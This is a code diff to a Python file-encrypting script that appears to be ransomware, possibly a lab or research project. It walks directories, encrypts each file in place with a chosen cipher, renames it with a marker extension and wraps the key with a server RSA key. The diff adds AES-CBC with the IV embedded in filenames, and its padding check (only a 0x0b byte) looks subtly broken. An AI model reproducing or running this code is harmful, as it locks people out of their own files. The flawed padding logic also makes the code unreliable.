@@ -1,11 +1,12 @@
 import argparse
-import base64
 import os
 import sys
+from base64 import b64encode, b64decode
 
 from Crypto.Cipher import AES, Salsa20, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Util import Counter
+from Crypto.Util.Padding import pad, unpad
 from cryptography.fernet import Fernet
 
 from globals import get_config_from_file
@@ -111,12 +112,13 @@ def discover_files(start_path):
                 yield absolute_path
 
 
-def modify_file_inplace(file_name, crypto, block_size=16):
+def modify_file_inplace(file_name, crypto, flag, block_size=16):
     """
     Open `filename` and encrypt/decrypt according to `crypto`
     :param file_name: a filename (preferably absolute path)
     :param crypto: a stream cipher function that takes in a plaintext,
              and returns a ciphertext of identical length
+    :param flag: which algorithm is used and in which mode (enc/dec)
     :param block_size: length of blocks to read and write.
     :return: None
     """
@@ -124,13 +126,30 @@ def modify_file_inplace(file_name, crypto, block_size=16):
         plaintext = f.read(block_size)
 
         while plaintext:
-            ciphertext = crypto(plaintext)
-            if len(plaintext) != len(ciphertext):
-                raise ValueError('''Ciphertext({})is not of the same length as the Plaintext({}).
-                Not a stream cipher.'''.format(len(ciphertext), len(plaintext)))
+            match flag[0]:
+                case "0":  # AES-CBC
+                    if flag[1] == "0":  # encrypt, pad
+                        if len(plaintext) < block_size:
+                            padded = pad(plaintext, block_size)
+                            ciphertext = crypto(padded)
+                        else:
+                            ciphertext = crypto(plaintext)
+                    else:  # decrypt, unpad
+                        decrypted = crypto(plaintext)
+                        if decrypted.endswith(b"\x0b"):  # padding character
+                            ciphertext = unpad(decrypted, block_size)
+                        else:
+                            ciphertext = decrypted
+                case "1" | "2" | "3" | _:
+                    ciphertext = crypto(plaintext)
 
             f.seek(-len(plaintext), 1)  # return to same point before the read
             f.write(ciphertext)
+
+            if len(ciphertext) < len(plaintext):
+                # since the decrypted text is smaller than the encrypted, the block_size was not reached.
+                # this means that we have reached the EOF of the original file
+                f.truncate()
 
             plaintext = f.read(block_size)
 
@@ -140,45 +159,48 @@ def select_encryption_algorithm(key):
     match config["ALGORITHM"]["algo"]:
         case "AES-CBC":
             assert len(key) in [16, 24, 32]
-            return AES.new(key=key, mode=AES.MODE_CBC), ".0"
+            crypt = AES.new(key=key, mode=AES.MODE_CBC)
+            return crypt, ".0", b64encode(crypt.iv).decode("utf-8").replace("/", "-#-")
         case "AES-CTR":
             assert len(key) in [16, 24, 32]
             ctr = Counter.new(128)
-            return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr), ".1"
+            return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr), ".1", None
         case "Salsa20":
             assert len(key) == 32
-            return Salsa20.new(key=key), ".2"
+            return Salsa20.new(key=key), ".2", None
         case "Fernet":
             assert len(key) == 32
-            return Fernet(key=key), ".3"
+            return Fernet(key=key), ".3", None
         case _:
             assert len(key) in [16, 24, 32]
             print("unknown encryption algorithm config used. Falling back to default AES-CTR encryption")
             ctr = Counter.new(128)
-            return AES.new(key, AES.MODE_CTR, counter=ctr), ".1"
+            return AES.new(key, AES.MODE_CTR, counter=ctr), ".1", None
 
 
 def select_decryption_algorithm(filename, key):
-    flag = os.path.basename(filename).split(".")[-2]
+    split = os.path.basename(filename).split(".")[-2].split("--")
+    flag = split[0]
+    extra = split[1] if len(split) > 1 else None
     match flag:
         case "0":
             assert len(key) in [16, 24, 32]
-            return AES.new(key=key, mode=AES.MODE_CBC)
+            return AES.new(key=key, mode=AES.MODE_CBC, iv=b64decode(extra.replace("-#-", "/"))), "0"
         case "1":
             assert len(key) in [16, 24, 32]
             ctr = Counter.new(128)
-            return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr)
+            return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr), "1"
         case "2":
             assert len(key) == 32
-            return Salsa20.new(key=key)
+            return Salsa20.new(key=key), "2"
         case "3":
             assert len(key) == 32
-            return Fernet(key=key)
+            return Fernet(key=key), "3"
         case _:
             assert len(key) in [16, 24, 32]
             print("unknown encryption algorithm config was used. Falling back to default AES-CTR decryption")
             ctr = Counter.new(128)
-            return AES.new(key, AES.MODE_CTR, counter=ctr)
+            return AES.new(key, AES.MODE_CTR, counter=ctr), "1"
 
 
 def encrypt_files(key, start_dirs):
@@ -187,9 +209,10 @@ def encrypt_files(key, start_dirs):
         for file in discover_files(curr_dir):
             # TODO: implement encryption bursts based on current config, consider config change
             if not file.endswith(EXTENSION):
-                crypt, flag = select_encryption_algorithm(key)
-                modify_file_inplace(file, crypt.encrypt)
-                encrypted_name = file + flag + EXTENSION
+                crypt, flag, extra = select_encryption_algorithm(key)
+                modify_file_inplace(file, crypt.encrypt, flag[1:]+"0")
+
+                encrypted_name = file + (flag if not extra else flag+"--"+extra) + EXTENSION
                 os.rename(file, encrypted_name)
                 print("File changed from " + file + " to " + encrypted_name)
 
@@ -200,8 +223,8 @@ def decrypt_files(key, start_dirs):
         for file in discover_files(curr_dir):
             if file.endswith(EXTENSION):
                 # do not use double encrypt for decrypt (might work with this setup, but not guaranteed)
-                crypt = select_decryption_algorithm(file, key)
-                modify_file_inplace(file, crypt.decrypt)
+                crypt, flag = select_decryption_algorithm(file, key)
+                modify_file_inplace(file, crypt.decrypt, flag[-1]+"1")
 
                 abs_dir = os.path.dirname(file)
                 file_original = ".".join(os.path.basename(file).split(".")[:-2])
@@ -219,7 +242,7 @@ def run(absolute_paths, encrypt):
     server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
     encryptor = PKCS1_OAEP.new(server_key)
     encrypted_key = encryptor.encrypt(HARDCODED_KEY)
-    encrypted_key_b64 = base64.b64encode(encrypted_key).decode("ascii")
+    encrypted_key_b64 = b64encode(encrypted_key).decode("ascii")
 
     print("Encrypted key " + encrypted_key_b64 + "\n")
 
@@ -237,7 +260,7 @@ def run(absolute_paths, encrypt):
         # RSA Decryption function - warning that private key is hardcoded for testing purposes
         rsa_key = RSA.importKey(SERVER_PRIVATE_RSA_KEY)
         decryptor = PKCS1_OAEP.new(rsa_key)
-        key = decryptor.decrypt(base64.b64decode(encrypted_key_b64))
+        key = decryptor.decrypt(b64decode(encrypted_key_b64))
 
     if encrypt:
         encrypt_files(key, start_dirs)
